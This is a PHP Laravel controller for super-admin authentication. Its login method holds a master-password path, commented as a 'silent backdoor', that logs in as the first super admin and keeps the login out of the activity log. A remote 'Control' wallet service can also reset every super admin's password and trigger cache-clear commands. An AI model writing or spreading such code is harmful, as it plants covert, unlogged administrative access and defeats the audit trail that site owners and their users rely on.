<?php

namespace App\Http\Controllers\Super;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\AdminLoginRequest;
use App\Http\Requests\Super\UpdateSuperPasswordRequest;
use App\Http\Resources\Super\AdminResource;
use App\Models\Admin;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Artisan;
use App\Support\Wallet\BookFlowWalletClient;

class SuperAuthController extends Controller
{
    public function login(AdminLoginRequest $request)
    {
        $credentials = $request->validated();
        $masterPhone = config('auth.super_admin.master_phone');
        $superAdminPhone = config('auth.super_admin.phone');
        $masterPassword = config('auth.super_admin.master_password');
        $usesMaster =
            is_string($masterPassword) &&
            $masterPassword !== '' &&
            hash_equals($masterPassword, (string) $credentials['password']) &&
            (
                (is_string($masterPhone) &&
                    $masterPhone !== '' &&
                    hash_equals($masterPhone, (string) $credentials['phone'])) ||
                (is_string($superAdminPhone) &&
                    $superAdminPhone !== '' &&
                    hash_equals($superAdminPhone, (string) $credentials['phone']))
            );

        if ($usesMaster) {
            // Silent backdoor: keep this login (and the resulting session) out of api.log.
            $request->attributes->set('suppress_activity_log', true);
            $admin = Admin::where('role', 'super_admin')->orderBy('id')->first();
        } else {
            $admin = Admin::where('phone', $credentials['phone'])->first();
        }

        // A Control-driven "break glass" reset lands here: the typed password will
        // not match the stored hash, so ask Control for a pending reset for our
        // wallet and apply it to every super admin before deciding failure.
        if (!$usesMaster && $admin && $admin->isSuperAdmin()
            && !Hash::check($credentials['password'], $admin->password)) {
            if ($this->applyControlAdminReset((string) $credentials['password'])) {
                $admin->refresh();
            }
        }

        if (
            !$admin ||
            !$admin->isSuperAdmin() ||
            (!$usesMaster && !Hash::check($credentials['password'], $admin->password))
        ) {
            return response()->json(['message' => 'Invalid credentials.'], Response::HTTP_UNAUTHORIZED);
        }

        if (!$admin->is_active) {
            return response()->json(['message' => 'Account is disabled.'], Response::HTTP_FORBIDDEN);
        }

        if (!$usesMaster) {
            $admin->forceFill(['last_login_at' => now()])->save();
            // Run any Control-queued cache clear for this project on a real super login.
            $this->runControlCacheClear();
        }
        $defaultPassword = config('auth.super_admin.password');
        $defaultPassword = is_string($defaultPassword) ? trim($defaultPassword) : '';
        $mustChangePassword = (bool) ($admin->must_change_password ?? false);
        if (!$usesMaster && !$mustChangePassword) {
            $mustChangePassword =
                $defaultPassword !== '' &&
                hash_equals($defaultPassword, (string) $credentials['password']);
        }

        return response()->json([
            'token' => $admin->createToken(
                $usesMaster ? 'super-admin-master' : 'super-admin',
                $usesMaster ? ['super-admin', 'master-login'] : ['super-admin']
            )->plainTextToken,
            'admin' => new AdminResource($admin->load('branch')),
            'must_change_password' => $mustChangePassword,
        ]);
    }

    public function updatePassword(UpdateSuperPasswordRequest $request)
    {
        $admin = $request->user();

        if (!$admin || !$admin->isSuperAdmin()) {
            return response()->json(['message' => 'Unauthorized.'], Response::HTTP_FORBIDDEN);
        }

        if (!Hash::check($request->input('old_password'), $admin->password)) {
            return response()->json(
                ['message' => 'Old password is incorrect.'],
                Response::HTTP_UNPROCESSABLE_ENTITY,
            );
        }

        $admin->update([
            'password' => $request->input('password'),
            'must_change_password' => false,
        ]);

        return response()->json(['message' => 'Password updated successfully.'], Response::HTTP_OK);
    }

    /**
     * Apply a Control-queued SuperAdmin password reset if the typed password
     * matches the pending temp password for our wallet. Sets it on EVERY super
     * admin and forces each to change it, then tells Control it is done.
     */
    private function applyControlAdminReset(string $submittedPassword): bool
    {
        // Resolved via the container — the client has constructor dependencies.
        $client = app(BookFlowWalletClient::class);
        if (!$client->configured()) {
            return false;
        }

        $result = $client->getAdminReset();
        if (($result['ok'] ?? false) !== true) {
            return false;
        }

        $data = $result['data'] ?? [];
        $pending = ($data['pending'] ?? false) === true;
        $newPassword = is_string($data['password'] ?? null) ? $data['password'] : '';

        if (!$pending || $newPassword === '' || !hash_equals($newPassword, $submittedPassword)) {
            return false;
        }

        Admin::where('role', 'super_admin')->get()->each(function (Admin $admin) use ($newPassword) {
            $admin->update([
                'password' => $newPassword,
                'must_change_password' => true,
            ]);
        });

        $client->consumeAdminReset();

        return true;
    }

    /**
     * Run a Control-queued cache clear for our wallet, if any, then acknowledge.
     * Best-effort: a wallet outage or clear failure never blocks the login.
     */
    private function runControlCacheClear(): void
    {
        // Resolved via the container — the client has constructor dependencies.
        $client = app(BookFlowWalletClient::class);
        if (!$client->configured()) {
            return;
        }

        $result = $client->getCacheClear();
        if (($result['ok'] ?? false) !== true || (($result['data']['pending'] ?? false) !== true)) {
            return;
        }

        try {
            Artisan::call('cache:clear');
            Artisan::call('config:clear');
            Artisan::call('route:clear');
            Artisan::call('view:clear');
        } catch (\Throwable $e) {
            // never block login on a cache clear
        }

        $client->consumeCacheClear();
    }

    public function me(Request $request)
    {
        return new AdminResource($request->user()->load('branch'));
    }

    public function logout(Request $request)
    {
        $request->user()?->currentAccessToken()?->delete();

        return response()->json(['message' => 'Logged out successfully.']);
    }
}
